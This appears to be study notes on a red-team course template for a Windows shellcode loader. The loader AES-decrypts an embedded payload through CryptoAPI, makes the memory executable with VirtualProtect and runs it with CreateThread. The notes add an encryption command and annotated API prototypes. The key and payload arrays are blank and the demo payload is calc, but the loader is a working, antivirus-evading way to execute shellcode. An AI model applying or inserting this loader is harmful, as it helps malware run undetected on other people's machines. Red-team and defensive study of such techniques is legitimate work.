
Code snippet
```c
/*

 Red Team Operator course code template
 payload encryption with AES
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = 
	unsigned char calc_payload[] = 
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```

---

Encrypt payload - take the key
```bash
python aesencrypt.py calc.bin
```

---

In Windows API, you can use and older **Cryptographic API (CryptoAPI)** to perform AES encryption and decryption with functions like `CryptAcquireContextW()`, `CryptHashData()`, `CryptEncrypt()` or `CryptDecrypt()`. But Win API delivers another, newer API - the **Cryptography API: Next Generation** (CNG) with several functions for AES, ex. `BCryptOpenAlgorithmProvider()`, `BCryptGenerateSymmetricKey()`, `BCryptEncrypt()`, etc.

#### Decrypting AES payload algorithm (C-like pseudo-code)

```c
// 1. open a handle hProv to a Cryptographic Service Provider - a module
// implementing specific crypto algorithms, like RSA, AES, etc.
CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)

// 2. prepare a new hashing object to generate a SHA-256 hash from the provided key
CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)

// 3. create SHA-256 hash from the key
CryptHashData(hHash, key, keylen, 0)

// 4. derive a symmetric AES-256 key from the hash
CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)

// 5. finally, decrypt the payload
CryptDecrypt(hKey, NULL, 0, 0, payload, &payload_len)
```

---
#### Key Windows API functions

[**_CryptAcquireContextW()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta) is used to acquire a handle to a **Cryptographic Service Provider** (CSP) and, if necessary, to create a new key container. In other words, this function helps to establish a cryptographic context that allows applications to access and use cryptographic services provided by the CSP. A CSP is a software module that implements cryptographic algorithms and provides services such as encryption, decryption, hashing, and digital signatures. This function can be found in the _advapi32.dll_ library.

`CryptAcquireContextW()` function has the following prototype:

```c
BOOL WINAPI CryptAcquireContextW(
  HCRYPTPROV *phProv,        // pointer to a handle of a CSP [out param]
  LPCWSTR    pszContainer,   // key container name (null-terminated string). When dwFlags is set to CRYPT_VERIFYCONTEXT, pszContainer must be set to NULL
  LPCWSTR    pszProvider,    // null-terminated string that contains the name of the CSP to be used. If NULL == default provider
  DWORD      dwProvType,    // type of provider to acquire, ex. PROV_RSA_FULL, PROV_RSA_AES, PROV_DSS_DH, etc.
  DWORD      dwFlags        // flag values, usually set to zero. CRYPT_VERIFYCONTEXT for ephemeral keys
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).

---

[**_CryptCreateHash()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash) is used to create a handle to a hash object for a particular hash algorithm. This function can be found in the _advapi32.dll_ library.

`CryptCreateHash()` function has the following prototype:

```c
BOOL WINAPI CryptCreateHash(
  HCRYPTPROV hProv,    // handle to a CSP created by a call to CryptAcquireContext()
  ALG_ID     Algid,    // identifies the hash algorithm to use, ex. CALG_SHA_256, CALG_AES_128, CALG_ECDH, etc.
  HCRYPTKEY  hKey,     // type of hash algorithm is a keyed hash (like MAC or HMAC). Zero if nonkeyed algos
  DWORD      dwFlags,  // 0 or CRYPT_SECRETDIGEST (not used)
  HCRYPTHASH *phHash   // address to which the function copies a handle to the new hash object 
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).